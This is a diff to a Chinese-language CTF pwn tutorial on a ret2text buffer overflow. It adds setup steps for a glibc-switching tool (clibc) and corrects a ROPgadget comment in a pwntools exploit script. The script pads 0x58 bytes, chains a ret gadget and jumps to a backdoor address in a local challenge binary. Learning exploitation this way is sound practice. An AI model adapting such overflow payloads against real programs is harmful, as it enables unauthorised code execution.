@@ -33,6 +33,27 @@ io.interactive()
 
 若本地环境大于Ubuntu18，则需要使用clibc去将程序的glibc版本修改到旧版本，否则无法成功利用漏洞。
 
+[下载链接](https://github.com/tower111/pwn-change-libc)
+
+```bash
+git clone https://github.com/tower111/pwn-change-libc
+cd pwn-change-libc
+```
+
+将此项目下update_list文件第一行的python改为python3
+
+```bash
+python3 get_env.py
+sudo ln -s <clibc的绝对路径> /usr/bin/clibc
+```
+
+使用方法：
+
+```bash
+#clibc 目标文件 目标版本
+clibc pwn 2.21
+```
+
 ```bash
 #将glibc版本改为旧版本
 clibc pwn 2.23
@@ -90,7 +111,7 @@ elf = ELF("./pwn") #使用ELF函数去解析目标文件，存储为elf对象
 io = process("./pwn") #启动一个进程，命名为io
 io.recvuntil(b"do you know ret2text?\n") #一直接收数据，直到接收到指定数据
 back_door = 0x401235 #ida查找后门地址
-ret = 0x40101a #ROPgadget --binary ./pwn --only"pop|ret"
+ret = 0x40101a #ROPgadget --binary ./pwn --only "pop|ret"
 payload = b's'*0x58 + p64(ret) + p64(back_door) #填充正常空间+rbp + 恶意地址
 io.sendline(payload) #发生payloa
 io.interactive() #进行交互
